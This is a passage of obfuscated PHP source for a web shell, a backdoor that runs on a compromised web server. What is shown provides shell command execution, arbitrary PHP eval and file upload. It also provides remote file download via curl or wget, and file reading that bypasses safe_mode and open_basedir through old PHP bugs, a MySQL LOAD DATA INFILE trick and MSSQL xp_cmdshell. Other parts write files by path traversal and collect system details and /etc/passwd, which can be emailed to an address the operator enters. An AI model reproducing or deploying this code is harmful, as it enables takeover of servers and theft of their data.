src="?act=f&amp;f='.@urlencode($f).'&amp;d='.@urlencode($d).'&white=1&ft=htmls">'.z9y("471").'</iframe>')).z5b(),'2'); } break; case 'code': echo z7w('','2').z7o().z6q(); z1p($r,$ext); echo z7f().z7y().z10q(); break; case 'exe': if(!@isset($ecmd)){ $ext=z2l($f,'.'); $ecmd=$d.$f; foreach($execaliases as $ek=>$ev){ if(@in_array(@strtolower($ext),$ev)){ $ecmd=@str_replace("%f%",$ecmd,$ek); break; } } } echo z5x(array("act"=>"f","ft"=>"exe","d","f","exec"=>"1"),z10w( z5b(). z7u(z6l(z7n(z9y("120")).z5y('ecmd','',"9").z8b(z9y("99"),"7"))). z5b() ,"2")); if(@isset($exec)&&$exec&&!@empty($ecmd)){ echo z9m("2").z6f().z6q().z5w('',"1"); $res=z9e($ecmd); echo $res; echo z5q().z7f().z7y().z5b().z10q(); } break; case 'sess': echo z7w('','2').z7o().z6q().'<pre>'; $e=@explode('|',$r); echo $e[0].z9z(); @var_dump(@unserialize($e[1])); echo '</pre>'; echo '</pre>'.z7f().z7y().z10q(); break; case 'ini': echo z7w('','2').z7o().z6q().'<pre>'; @var_dump(@parse_ini_file($d.$f,true)); echo '</pre>'.z7f().z7y().z10q(); break; case 'sdb': echo z7w('','2').z7o().z6q().'<pre>'; @var_dump(@unserialize(@base64_decode($r))); echo '</pre>'.z7f().z7y().z10q(); break; case 'img': if(!@isset($is)) $is=50; $inf=@getimagesize($d.$f); if(@isset($inf[0]) && @isset($inf[1]) && @isset($inf['mime'])){ $w=$inf[0]/100*$is; $h=$inf[1]/100*$is; $mime=$inf["mime"]; } else { $w=$h=$t=''; if(@preg_match('/(jpg|jpeg|gif|png)/i', $r, $m)) $t = ($m[1] === 'jpeg') ? 'jpg' : $m[1]; $mime='image/'.@strtolower($t); } if(!@isset($white)||!$white){ echo z5z("center").z9z(); if($w!=''){ foreach(array('20','50','100','150','200') as $v) echo z5x(array('act'=>'f','d','f','ft'=>'img','is'=>$v),z8b($v.'%',($is==$v?'17':'16'))); } echo z9z(2).'<img alt="" src="?act=f&amp;f='.@urlencode($f).'&amp;ft=img&amp;white=1&amp;d='.@urlencode($d).'"'.($w!=''?' width="'.$w.'"':'').($h!=''?' height="'.$h.'"':'').' border="0" style="border: 1px solid #DDDDDD;">'.z5h().z9z(2); }else{ @ob_clean(); @header("Content-type: ".$mime); echo $r; exit(); } break; case 'hex': if(!@isset($hexdump_type)) $hexdump_type=''; if($hexdump_type=="full"){ $str=$r; }else{ $str=@substr($r,0,16*24); } $n=0; $a0=$a1=$a2=''; $ofs=0; $len=@strlen($str); for($i=0;$i<$len;$i++){ $a1.=@sprintf('%02X',@ord($str[$i])).z9x(); if(@ord($str[$i])==0){ $a2.=z5p("0"); } elseif(@ord($str[$i])>=0x20 && @ord($str[$i])<=0x7E){ $a2.= @htmlspecialchars($str[$i]); } else { $a2 .= "."; } $n++; if($n==24||($i+1==$len&&!@is_int($len/24))){ $n=0; $a0.=@sprintf('%08X',$ofs).z9z(); $a1.=z9z(); $a2.=z9z(); $ofs+=24; } } echo z10w(z9d(z6l(z10w(z7u(z9c($a0,'16').z9c($a1,'17').z9c($a2,'18')),'8').z10w(z9d(z6z(z5x(array('act'=>'f','d','f','ft','hexdump_type'=>($hexdump_type=='full'?'preview':'full')),z8b(($hexdump_type=='full'?z9y("122"):z9y("121")),'7')))),'8'))),'2'); break; case 'download': @ob_clean(); @header("Content-type: application/octet-stream"); @header("Content-disposition: attachment; filename=\"".$f."\";"); echo $r; exit(); break; default: break; } } else { if(!@isset($loadb)) $loadb=0; $rbut=z5x($back_form_actions,z8b(z9y("470"),"7")); if(@empty($f)){ echo z3q(z9y("469").$fmsg.z9x(5).$rbut); } else { switch($ft){ case 'new': if(!z4r($d.$f)&&z4j($d)&&!z0n($d)){ $loadb=1; } elseif(!z4r($d.$f)){ $loadb=1; } elseif(z4r($d.$f)&&z4j($d.$f)){ echo z3q(z9y("468",$d.$f).z9x(5).$rbut); } elseif(z4r($f)&&z4j($f)){ echo z3q(z9y("468",$f).z9x(5).$rbut); } break; default: if(z4r($d.$f)&&z4j($d.$f)){ echo z3q(z9y("468",$d.$f).z9x(5).$rbut); } elseif(z4r($f)&&z4j($f)){ echo z3q(z9y("468",$f).z9x(5).$rbut); } elseif(!z4r($d.$f)&&z4j($d) && z0n($d) && @strpos($f,"/")===false){ echo z3q(z10w(z7u(z9c(z7n(z9y("466",$d.$f)).z5x(array("act"=>"f","d","f","ft"=>"new"),z8b(z9y("195"),"7")).$rbut)),"2")); } else { $loadb=1; } break; } } if($loadb){ z0c($d.$f); $rf_arr=$sqlrf_arr=$wf_arr=array(); $rf_arr["include"]="include (safe_mode)"; if($bcurl&&@version_compare(@phpversion(),"5.2.0")<=0) $rf_arr["curl"]="curl (open_basedir / PHP <= 4.4.2, 5.1.4)"; if(!$win&&z7e('mb_send_mail')&&@version_compare(@phpversion(),"5.2.0")<=0) $rf_arr["mb_send_mail"]="mb_send_mail (safe_mode / PHP <= 4.0-4.2.2, 5.x)"; if(z7e('imap_open')&&z7e('imap_body')&&@version_compare(@phpversion(),"5.2.0")<=0) $rf_arr["imap_body"]="imap_body (safe_mode on PHP <= 5.1.2)"; if(z7e('ini_restore')&&@version_compare(@phpversion(),"5.2.0")<=0) $rf_arr["ini_restore"]="ini_restore (safe_mode / PHP <= 4.4.4, 5.1.6) by NST"; if(z7e('copy')&&@version_compare(@phpversion(),"5.2.0")<=0) $rf_arr["zlib"]="copy[compress.zlib://] (safe_mode / PHP <= 4.4.2, 5.1.2)"; if($bmysql) $sqlrf_arr["mysql"]="mysql (safe_mode)"; if($bmssql) $sqlrf_arr["mssql"]="mssql (safe_mode)"; if(z7e('error_log')&&@version_compare(@phpversion(),"5.2.2")<=0) $wf_arr["error_log"]="error_log[php://] (open_basedir / PHP <= 5.1.4, 4.4.2)"; if(z7e('readfile')&&@version_compare(@phpversion(),"5.2.2")<=0) $wf_arr["readfile"]="readfile[php://] (open_basedir / PHP <= 5.2.1, 4.4.4)"; if(@version_compare(@phpversion(),"5.2.4")<=0) $wf_arr["fopen"]="fopen[srpath://] (open_basedir / PHP v5.2.0)"; if(@count($rf_arr)>0){ echo z3q(z9y("128")); echo z6s(); echo z5x(array("act"=>"f","d","f"=>(@isset($readfile)?$readfile:$d.$f),"ft"=>"functions","submit1"=>"1"),z10w(z7u(z5t(z9y("129")).z9c(z6u("readfile",(@isset($readfile)?$readfile:$d.$f),"0","","9").z3m("readfile_func",$rf_arr,"5",1).z8b(z9y("130"),"7"))),"2")); if(@isset($submit1)&&$submit1&&@isset($readfile)&&!@empty($readfile)){ echo z9m("2").z7o().z5t(z9x()).z7j(); switch($readfile_func){ case 'include': echo z5w('','1'); @include ($readfile); echo z5q(); break; case 'curl': echo z5w('','1'); $ci=@curl_init("file://".$readfile); $cf=@curl_exec($ci); echo @htmlspecialchars($cf); echo z5q(); break; case 'mb_send_mail': echo z5w('','1'); $temp=tempnam($d,"fname"); if(@file_exists($temp)) @unlink($temp); $extra="-C ".$readfile." -X $temp"; @mb_send_mail(NULL,NULL,NULL,NULL,$extra); $str=z9o($temp); echo @htmlspecialchars($str); echo z5q(); @unlink($temp); break; case 'imap_body': echo z5w('','1'); $stream=@imap_open($readfile,"",""); $str=@imap_body($stream,1); echo @htmlspecialchars($str); @imap_close($stream); echo z5q(); break; case 'ini_restore': @ini_restore("safe_mode"); @ini_restore("open_basedir"); $str=z9o($readfile); echo z5w('','1').@htmlspecialchars($str).z5q(); break; case 'zlib': $str=z9u($readfile); echo z5w('','1').@htmlspecialchars($str).z5q(); break; } echo z7f().z7y().z10q(); } echo z6s(); } if(@count($sqlrf_arr)>0){ echo z3q(z9y("131")); echo z6s(); echo z5x(array("act"=>"f","d","f"=>(@isset($readfile)?$readfile:$d.$f),"ft"=>"functions","submit2"=>"1"),z10w(z7u(z5t(z9y("129")).z9c(z6u("readfile",(@isset($readfile)?$readfile:$d.$f),"0","","9").z3m("sqlreadfile_func",$sqlrf_arr,"5",1).z8b(z9y("130"),"7"))). z7u(z5t(z9y("132")).z9c(z5y("sqluser","root","4","","9").z9x(2).z7n(z9y("133")).z5y("sqlpass","","4").z9x(2).z7n(z9y("134")).z5y("sqlport","3306","1").z9x(2).z7n(z9y("135")).z5y("sqldb","mysql","4"))),"2")); if(@isset($submit2)&&$submit2&&@isset($readfile)&&!@empty($readfile)&&@isset($sqluser)&&@isset($sqlpass)&&@isset($sqlport)&&@isset($sqldb)){ echo z9m("2").z7o().z5t(z9x()).z7j(); switch($sqlreadfile_func){ case 'mysql': echo z5w('','1'); if(@empty($sqlport)) $sqlport="3306"; $db=@mysql_connect('localhost:'.$sqlport,$sqluser,$sqlpass); if($db){ if(@mysql_select_db($sqldb,$db)){ @mysql_query("DROP TABLE IF EXISTS temp_mysql_readfile_table"); @mysql_query("CREATE TABLE `temp_mysql_readfile_table` ( `file` LONGBLOB NOT NULL )"); @mysql_query("LOAD DATA INFILE \"".$readfile."\" INTO TABLE temp_mysql_readfile_table"); $r=@mysql_query("SELECT * FROM temp_mysql_readfile_table"); while(($r_sql=@mysql_fetch_array($r))!==false){ echo @htmlspecialchars($r_sql[0])."\r\n"; } @mysql_query("DROP TABLE IF EXISTS temp_mysql_readfile_table"); }else echo z9y("136"); @mysql_close($db); }else echo z9y("137","MySQL"); echo z5q(); break; case 'mssql': echo z5w('','1'); if(@empty($sqlport)) $sqlport="1433"; $db=@mssql_connect('localhost,'.$sqlport,$sqluser,$sqlpass); if($db){ if(@mssql_select_db($sqldb,$db)){ @mssql_query("drop table mssql_readfile_temp_table",$db); @mssql_query("create table mssql_readfile_temp_table ( string VARCHAR (500) NULL)",$db); @mssql_query("insert into mssql_readfile_temp_table EXEC master.dbo.xp_cmdshell '".$readfile."'",$db); $res=@mssql_query("select * from mssql_readfile_temp_table",$db); while(($row=@mssql_fetch_row($res))!==false){ echo @htmlspecialchars($row[0])."\r\n"; } @mssql_query("drop table mssql_readfile_temp_table",$db); }else echo z9y("136"); @mssql_close($db); }else echo z9y("137","MsSQL"); echo z5q(); break; } echo z7f().z7y().z10q(); } echo z6s(); } if(@count($wf_arr)>0){ echo z3q(z9y("138")); echo z6s(); echo z5x(array("act"=>"f","d","f"=>(@isset($writefile)?$writefile:$d.$f),"ft"=>"functions","submit3"=>"1"), z10w( z7u(z5t(z9y("139")).z9c(z5y("writefile",$d.$f,"0","","9").z3m("writefile_func",$wf_arr,"5",1).z8b(z9y("141"),"7"))). z7u(z5t(z9y("140")).z9c(z5w("writecontent","1").(@isset($writecontent)?@htmlspecialchars($writecontent):'<? phpinfo(); ?>').z5q())),"2")); if(@isset($submit3)&&$submit3&&@isset($writefile)&&!@empty($writefile)){ echo z9m("2").z6f().z5t(z9x()).z7j(); switch($writefile_func){ case 'error_log': @error_log($writecontent,3,"php://../../../../../../../../../../../".$writefile); if(z4r($writefile)) echo z9y("243"); break; case 'readfile': @readfile($writecontent,3,"php://../../../../../../../../../../../".$writefile); if(z4r($writefile)) echo z9y("243"); break; break; case 'fopen': if($fp=@fopen('srpath://../../../../../../../../../../../'.$writefile,"a")){ @fputs($fp,$writecontent); @fclose($fp); echo z9y("243"); } break; default: break; } echo z7f().z7y().z10q(); } echo z6s(); } } } } if($act=='search'){ $ftarget=1; $fullpath=1; if(!@isset($s_in)||@empty($s_in)) $s_in=$d; if(!@isset($sn)||@empty($sn)){ $sn="(.*)"; $sn_reg=1; } if(!@isset($sn_reg)) $sn_reg=''; if(!@isset($st)) $st=''; if(!@isset($st_reg)) $st_reg=''; if(!@isset($st_wwo)) $st_wwo=''; if(!@isset($st_cs)) $st_cs=''; if(!@isset($st_not)) $st_not=''; if(!@isset($s_fd)) $s_fd=''; if(!@isset($s_rec)) $s_rec='1'; if(!@isset($find_text)||@empty($find_text)) $find_text="text"; if(!@isset($find_in_dir)||@empty($find_in_dir)) $find_in_dir=$d; if(!@isset($find_in_files)||@empty($find_in_files)) $find_in_files="*.php;*.txt"; z0h(); if(@isset($submit)&&$submit){ $found=array(); $found_d=0; $found_f=0; $search_i_f=0; $search_i_d=0; $ar=array("sn"=>$sn, "sn_reg"=>$sn_reg, "st"=>$st, "st_reg"=>$st_reg, "st_wwo"=>$st_wwo, "st_cs"=>$st_cs, "st_not"=>$st_not, "s_fd"=>$s_fd); $in=@array_unique(@explode(";",$s_in)); foreach($in as $v){ $sdir=$v; z5d($v); } if(@count($found)==0){ echo z3q(z9y("160")); }else{ $nolsmenu=1; $nohead=1; $ls_a=$found; $act="ls"; } } } if($act=='cmd'){ $st_a=array(''=>'-',' 2>&1'=>'2>&1'); echo z3q( z10w( z7u( z6l( z7n(z9y("180")).z9k('','command').z2x(array('act'=>'cmd','d','cmdsubmit'=>'1')).z6u('cmd','','0').($nix?z3m('stderr',$st_a,'1','1'):'').z8b('&raquo;','7').z9l() ,'','2'). z6l( z7n(z9y("181")).z5x(array('act'=>'cmd','d','cmdsubmit'=>'1'),z2k('scmd',($win?$winaliases:$nixaliases),'0','1').($nix?z3m('stderr',$st_a,'1','1'):'').z8b('&raquo;','7')) ,'') ) ,'2')); echo z9m('2').z6f().z6q().z5w('','0',1); if(@isset($cmdsubmit)&&$cmdsubmit){ echo z9e((@isset($cmd)?(@isset($stderr)?$cmd.$stderr:$cmd):(@isset($stderr)?$scmd.$stderr:$scmd))); } echo z5q().z7f().z7y().z10q(); } if($act=='phpinfo'){ $piarr=z1w(1); $h=0; foreach($piarr as $k=>$v){ echo z3q(@strtoupper($k)); echo z9m('2'); $i=0; foreach($v as $a=>$b){ if(@is_string($b)){ echo z9d(z9c($a,'14','25').z9c($b,'14'),($i%2?'0':'1')); $i++; } } $h++; echo z10q(); } } if($act=='sysinfo'){ $g_arr=array(); $date=@date("D M j G:i:s T Y"); $users=array(); if($bpasswd) $users=z8l(1); $distro=z1b(); $uptime=($nix&&$sh_exec)?z9e("uptime"):''; $system=$host=$kernel=""; $sys=(($nix&&$sh_exec)?z9e("uname -a"):(z7e('php_uname')?@php_uname("a"):'   ')); if($nix) @list($system, $host, $kernel,) = @explode(" ", $sys); if(!@empty($sys)) $g_arr[]=array("System",$sys,$sys); if(!@empty($system)&&!@empty($kernel)) $g_arr[]=array((($linux)?"Kernel":"Version"),$system." ".$kernel,$system." ".$kernel); if(!@empty($distro)) $g_arr[]=array("Distro name",$distro,nl2br($distro)); $idu=""; if($nix&&$sh_exec){ $idu=z9e("id"); $eid=@explode(" ",$idu); if(@count($eid)>=2) $idu=$eid[0]." ".$eid[1]; } if(!@empty($idu)) $g_arr[]=array("User id",$idu,$idu); if(!@empty($uptime)) $g_arr[]=array("Uptime",$uptime,$uptime); if(!@empty($date)) $g_arr[]=array("Local time",$date,$date); $g_arr[]=array("CPU info",z3o(),z3o()); $mem=z5a(); $g_arr[]=array("RAM info",$mem[0][1],$mem[0][0].$mem[0][1]); if($nix) $g_arr[]=array("RAM buffered",$mem[1][1],$mem[1][0].$mem[1][1]); if($nix) $g_arr[]=array("Swap",$mem[2][1],$mem[2][0].$mem[2][1]); $disk=z9r(); if(@count($disk)>1||!@isset($disk[0][0])){ foreach($disk as $dd=>$inf){ $g_arr[]=array("Space on ".$dd,$inf[1],$inf[0].$inf[1]); } }else{ $g_arr[]=array("Disk space",$disk[0][1],$disk[0][0].$disk[0][1]); } if(!@empty($host)){ $host .= " (".@gethostbyname($host).") "; } if(@preg_match('/^\d\.\d\.\d\.\d$/',$saddr)){ $host .= $saddr; } else { $host.= $saddr." (".@gethostbyname($saddr).")"; } $g_arr[]=array("Hostname",$host,$host); if(@count($users)>0){ if(@isset($viewusers)&&$viewusers){ $pusers=''; foreach($users as $uarr){ $pusers .= z5x(array("act"=>"ls","d"=>$uarr[1]),z8b($uarr[0],"1"),1).z9x()." "; } } else { $pusers=@count($users)." users on this box.".z9x().z5x(array("act"=>"sysinfo","d","viewusers"=>"1"),z8b("View","1")); } $g_arr[]=array("System users","",$pusers); } if(@count($g_arr)>0){ echo z3q(z9y("479")); echo z9m('2'); for($i=0;$i<@count($g_arr);$i++){ echo z9d(z9c($g_arr[$i][0],"14","25").z9c($g_arr[$i][2],"14","3"),($i%2?'0':'1')); } echo z10q(); } $bsmed=z8d("safe_mode_exec_dir"); $psmed=(($bsmed)?@ini_get("safe_mode_exec_dir"):"NONE"); $bsmid=z8d("safe_mode_include_dir"); $psmid=(($bsmid)?@ini_get("safe_mode_include_dir"):"NONE"); $opendirs=""; if($bopendir){ foreach(z9a(@ini_get("open_basedir")) as $od){ $opendirs .= z5x(array("act"=>"ls","d"=>$od),z8b($od,"1"),1).z9x()." "; } } $dfnc=z6h(); if(@count($dfnc)>0){ $ndfnc=@implode(" ", $dfnc); $pdfnc=""; foreach($dfnc as $fnc) $pdfnc .= z10t('http://php.net/manual/en/function.'.@str_replace("_","-",$fnc).'.php',$fnc,"1",1).z9x()." "; } else { $ndfnc="NONE"; $pdfnc=z5p("NONE"); } $p_arr=array(); $p_arr[]=array("PHP Version",@phpversion(),@phpversion().z9x().z5x(array("act"=>"phpinfo","d"),z8b("PHP Info","1"))); $p_arr[]=array("Open Basedir",(($bopendir)?@ini_get("open_basedir"):"NONE"),(($bopendir)?$opendirs:z5p("NONE"))); $p_arr[]=array("Safe-mode",(($bsafe)?"ON":"OFF"),($bsafe?z8k("ON"):z5p("OFF"))); if($bsafe){ $p_arr[]=array("Safe-mode exec dir",$psmed,(($bsmed)?z5p($psmed):z8k($psmed))); $p_arr[]=array("Safe-mode include dir",$psmid,(($bsmid)?z5p($psmid):z8k($psmid))); } foreach(array("register_globals","allow_url_fopen","allow_url_include","memory_limit","file_uploads","upload_tmp_dir","upload_max_filesize","post_max_size","magic_quotes_gpc") as $ini){ $p_arr[]=array(z3r(@str_replace("_"," ",$ini)),z3x(@ini_get($ini)),z3x(@ini_get($ini))); } $p_arr[]=array("Disabled Functions",$ndfnc,$pdfnc); if(@count($p_arr)>0){ echo z3q(z9y("480")); echo z9m('2'); for($i=0;$i<@count($p_arr);$i++){ echo z9d(z9c($p_arr[$i][0],"14","25").z9c($p_arr[$i][2],"14","3"),($i%2?'0':'1')); } echo z10q(); } if($nix){ $o_arr=array(); $tmp=$tmpp=''; foreach(array("/etc/"=>array("passwd","hosts","modules","fstab","issue","issue.net","motd"),"/proc/"=>array("cpuinfo","meminfo","version","interrupts")) as $ed=>$af){ foreach($af as $ef){ if(z4r($ed.$ef)&&z1y($ed.$ef)){ $tmp .= $ed.$ef." "; $tmpp .= z5x(array("act"=>"f","d"=>$ed,"f"=>$ef,"ft"=>"text"),z8b($ef,"1"),1).z9x()." "; } } } if(!@empty($tmp)) $o_arr[]=array(z9y("482"),$tmp,$tmpp); $tmp=$tmpp=''; foreach(array("/etc/"=>array("syslog.conf","syslogd.conf","rsyslog.conf","resolv.conf","httpd.conf","apache2.conf","apache.conf","apache2/apache.conf","proftpd.conf","proftpd.conf","inetd.conf"),"/etc/apache2/"=>array("httpd.conf","apache2.conf"),"/etc/proftpd/"=>array("proftpd.conf")) as $ed=>$af){ foreach($af as $ef){ if(z4r($ed.$ef)&&z1y($ed.$ef)){ $tmp .= $ed.$ef." "; $tmpp .= z5x(array("act"=>"f","d"=>$ed,"f"=>$ef,"ft"=>"text"),z8b($ef,"1"),1).z9x()." "; } } } if(!@empty($tmp)) $o_arr[]=array(z9y("483"),$tmp,$tmpp); $tmp=$tmpp=''; foreach(array("curl","fetch","links","lynx","GET","w3m","wget") as $ef){ $ff=z8t($ef); if(!@empty($ff)){ $tmp.=$ef." "; $tmpp.=z5x(array("act"=>"f","d"=>z3a($ff),"f"=>z2l($ff)),z8b(z2l($ef),"1"),1).z9x()." "; } } $tmp=$tmpp=''; foreach(array("gcc","cc","c++","g++","nasm","ld","make","cmake") as $ef){ $ff=z8t($ef); if(!@empty($ff)){ $tmp.=$ef." "; $tmpp.=z5x(array("act"=>"f","d"=>z3a($ff),"f"=>z2l($ff)),z8b(z2l($ef),"1"),1).z9x()." "; } } if(!@empty($tmp)) $o_arr[]=array(z9y("484"),$tmp,$tmpp); $tmp=$tmpp=''; foreach(array("perl","python","php","ruby","tcl") as $ef){ $ff=z8t($ef); if(!@empty($ff)){ $tmp.=$ef." "; $tmpp.=z5x(array("act"=>"f","d"=>z3a($ff),"f"=>z2l($ff)),z8b(z2l($ef),"1"),1).z9x()." "; } } if(!@empty($tmp)) $o_arr[]=array(z9y("485"),$tmp,$tmpp); if(@count($o_arr)>0){ echo z3q(z9y("481")); echo z9m('2'); for($i=0;$i<@count($o_arr);$i++){ echo z9d(z9c($o_arr[$i][0],"14","25").z9c($o_arr[$i][2],"14","3"),($i%2?'0':'1')); } echo z10q(); } } if($bmail){ $emsg=''; $msg=''; if(@isset($sendlog)&&$sendlog&&@isset($sysmail)&&!@empty($sysmail)){ $line=@str_repeat("-",100)."\r\n"; if(@count($g_arr)>0){ $msg.=$line.z9y("479")."\r\n".$line; for($i=0;$i<@count($g_arr);$i++){ if(!@empty($g_arr[$i][1])) $msg .= $g_arr[$i][0]." : ".$g_arr[$i][1]."\r\n"; } } if(@count($p_arr)>0){ $msg.=$line.z9y("480")."\n".$line; for($i=0;$i<@count($p_arr);$i++){ if(!@empty($p_arr[$i][1])) $msg .= $p_arr[$i][0]." : ".$p_arr[$i][1]."\r\n"; } } if(@count($o_arr)>0){ $msg.=$line.z9y("481")."\n".$line; for($i=0;$i<@count($o_arr);$i++){ if(!@empty($o_arr[$i][1])) $msg .= $o_arr[$i][0]." : ".$o_arr[$i][1]."\r\n"; } } $msg.=$line; if($bpasswd) $msg .= "/etc/passwd\n".$line.z9o("/etc/passwd").$line; $emsg=(@mail($sysmail,"SYSINFO|$saddr", $msg) ? z9y("243"):z9y("244")); } echo z3q(z9y("302").(($emsg!='')?" : ".$emsg:'')); echo z5x(array("act"=>"sysinfo","d","sendlog"=>"1"),z10w(z5b().z7u(z6l(z5y("sysmail",z7z('2',"email"),"0").z8b(z9y("179"),"7"))).z5b(),"2")); } } if($act=='eval'){ if(!@isset($evalsubmit)){ $eval_txt=1; } elseif(!@isset($eval_txt)){ $eval_txt=0; } echo z3q(z9y("182")).z6s(); echo z10w( z7u( z6l(z5x(array('act'=>'eval','d','evalsubmit'=>'1'), z5w('eval','1').(@isset($eval)?@htmlspecialchars($eval):'//readfile("/etc/passwd");'."\r\n").z5q().z9z().z5z("left","3").z8b(z9y("183"),'7','9').z5u("eval_txt",z9y("184"),"eval_txt").z5h()) ) ).z5b() ,'2'); if(@isset($evalsubmit)&&$evalsubmit){ $eval=@isset($eval)?$eval:""; if(!@empty($eval)){ $eval_result=""; $tmp=@ob_get_contents(); $olddir=@realpath(".")||@getcwd(); @chdir($d); if($tmp){ @ob_clean(); eval($eval); $ret=@ob_get_contents(); $ret=@convert_cyr_string($ret,"d","w"); @ob_clean(); echo $tmp; if($eval_txt){ $eval_result=@htmlspecialchars($ret); }else{ $eval_result=$ret; } }else{ if($eval_txt){ $eval_result=@eval($eval); }else{ $eval_result=$ret; } } @chdir($olddir); } if($eval_txt){ echo z10w( z7u( z6l(z5w('','1',1).(@isset($eval_result)?$eval_result:'').z5q()) ).z5b() ,'2'); } else { echo $eval_result; } } } if($act=='upload'){ if(z0n($d)){ $wdt=(($use_images)?'<img alt="+" border="0" style="vertical-align: middle; padding-left:2px;" src="?act=i&amp;img=ok">':z5p("+")); }else{ $wdt=(($use_images)?'<img alt="x" border="0" style="vertical-align: middle; padding-left:2px;" src="?act=i&amp;img=cancel">':z8k("x")); } $a_get=array(); $ls_a=array(); $umsg=$mmsg=$rmsg=''; if(!@isset($multiupload)){ if(@isset($usubmit)&&$usubmit){ global $_FILES; $dest=''; if(!@empty($_FILES['file1']['tmp_name'])){ $dest=$_FILES['file1']['name']; } if(@isset($rfile1)&&!@empty($rfile1)){ $dest=$rfile1; } if(!@isset($path1)||@empty($path1)) $path1=$d; $path1=z1k($path1); if(!@empty($dest)){ if(!@move_uploaded_file($_FILES['file1']['tmp_name'],$path1.$dest)){ $umsg = z9y("172",array($_FILES['file1']['name'],$_FILES['file1']['tmp_name'],$path1.$dest)); }else{ $umsg = z9y("173",array($_FILES['file1']['name'],$path1.$dest)); $ls_a[]=$path1.$dest; $nolsmenu=1; $act="ls"; $d=$path1; } $umsg = z10w(z7u(z9c($umsg))); } } echo z3q(z9y("161")).$umsg. z10w( z5b(). z9d( z9c( z5n(array('act'=>'upload','d','usubmit'=>'1'), z10w( z7u(z5t(z9y("162")).z9c(z9g('file1','2').z8b(z9y("170"),'7').$wdt)). z7u(z5t(z9y("163")).z9c(z6u('rfile1',(@isset($rfile1)?$rfile1:''),"9"))). z7u(z5t(z9y("164")).z9c(z6u('path1',(@isset($path1)?$path1:$d),"9"))) ) ) ). z9c( z5x(array('act'=>'upload','d','multiupload'=>'1'), z10w( z7u(z9c(z7n(z9y("166")).z6u('lno',((@isset($lno))?$lno:'10'),'1').z8b(z9y("169"),'7'))) ) ) ) ). z5b() ,'2'); } else { if(@isset($msubmit)&&$msubmit){ global $_FILES; foreach($_FILES as $fk=>$fv){ $dest=''; if(!@empty($_FILES[$fk]['tmp_name'])){ $dest=$_FILES[$fk]['name']; } if(@isset($rfile[$fk])&&!@empty($rfile[$fk])){ $dest=$rfile[$fk]; } if(!@isset($mpath)||@empty($mpath)) $mpath=$d; $mpath=z1k($mpath); if(!@empty($dest)){ if(!@move_uploaded_file($_FILES[$fk]['tmp_name'],$mpath.$dest)){ $mmsg .= z9y("172",array($_FILES[$fk]['name'],$_FILES[$fk]['tmp_name'],$mpath.$dest)).z9z(); }else{ $mmsg .= z9y("173",array($_FILES[$fk]['name'],$mpath.$dest)).z9z(); $ls_a[]=$mpath.$dest; $nolsmenu=1; $act="ls"; $ftarget='1'; $d=$mpath; } } } if($mmsg!='') $mmsg = z10w(z7u(z9c($mmsg))); } $form=''; if(!@is_numeric($lno)) $lno=10; for($i=0; $i<$lno; $i++){ $ii=($i+1); $form .= z7u(z5t(z9y("162")." ".$ii).z9c(z9g('file'.$ii,'2')).z5t(z9y("163")).z9c(z6u('rfile[file'.$ii.']','',"0"))); } echo z3q(z9y("168")).$mmsg. z5n(array('act'=>'upload','d','multiupload'=>'1','lno','msubmit'=>'1'),z10w(z5b().$form).z10w(z5b().z7u(z5t(z9y("164")).z9c(z6u('mpath',(@isset($mpath)?$mpath:$d),"9").z8b(z9y("170"),'7').$wdt)).z5b())); } if($bcurl) $a_get['phpcurl']="use php->curl"; if($bfsock) $a_get['fsock']="use php->fsockopen"; if(z7e('ini_get') && z8d('allow_url_fopen') && z7e('file_get_contents')) $a_get['file_get_contents']="use php->file_get_contents"; if($nix&&$sh_exec){ foreach($getaliases as $k=>$v){ if(z8t($k)) $a_get[$k]="use cmd->$k"; } } if(@count($a_get)>0){ if(@isset($rsubmit)&&$rsubmit){ $fct=''; if(!@preg_match(":^(http|https|ftp)\://([a-zA-Z0-9\.\-]+(\:[a-zA-Z0-9\.&%\$\-]+)*@)?((25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])|([a-zA-Z0-9\-]+\.)*[a-zA-Z0-9\-]+\.[a-zA-Z]{2,4})(\:[0-9]+)?(/[^/][a-zA-Z0-9\.\,\?\'\\/\+&%\$#\=~_\-@]*)*$:i",$uploadurl)){ $rmsg=z9y("171",$uploadurl); } else { $dest=z2l($uploadurl); if(@isset($nameurl)&&!@empty($nameurl)) $dest=$nameurl; if(@empty($dest)) $dest='index.html'; if(!@isset($rpath)||@empty($rpath)) $rpath=$d; $rpath=z1k($rpath); if(z4r($rpath.$dest)){ $i=1; while(z4r($rpath.$dest)){ if($i==1){ $dest=$dest.".".$i; }else{ $dest=@substr($dest,0,@strlen($dest)-2).".".$i; } $i++; } } if($upwith=='phpcurl'||$upwith=='fsock'||$upwith=='file_get_contents'){ if($upwith=='phpcurl') $fct=z3t($uploadurl); if($upwith=='fsock') $fct=z2h($uploadurl); if($upwith=='file_get_contents') $fct=@file_get_contents($uploadurl); if(!$fct||@empty($fct)){ $rmsg = z9y("174"); } else { if(z9t($rpath.$dest, $fct)){ $rmsg=z9y("176",$rpath.$dest); $ls_a[]=$rpath.$dest; $nolsmenu=1; $act="ls"; $d=$rpath; } else { $rmsg=z9y("175",$rpath.$dest); } } } else { if($nix&&$sh_exec&&@isset($getaliases[$upwith])){ $ucmd=@str_replace('[%1%]', $upwith, $getaliases[$upwith]); $ucmd=@str_replace('[%2%]', $uploadurl, $ucmd); $ucmd=@str_replace('[%3%]', $rpath.$dest, $ucmd); z9e($ucmd,1); if(z4r($rpath.$dest)){ $rmsg=z9y("176",$rpath.$dest); $ls_a[]=$rpath.$dest; $nolsmenu=1; $act="ls"; $d=$rpath; } else { $rmsg = z9y("174"); } } } } if($rmsg!='') $rmsg = z10w(z7u(z9c($rmsg))); } echo z3q(z9y("167")).$rmsg. z5x(array('act'=>'upload','d','rsubmit'=>'1'), z10w(z5b().z7u(z5t(z9y("165")).z9c(z6u('uploadurl',(@isset($uploadurl)?$uploadurl:'http://'),"0").z3m('upwith',$a_get,'4','1').z8b(z9y("170"),'7').$wdt)). z7u(z5t(z9y("163")).z9c(z6u('nameurl',(@isset($nameurl)?$nameurl:''),"9"))). z7u(z5t(z9y("164")).z9c(z6u('rpath',(@isset($rpath)?$rpath:$d),"9"))).z5b() 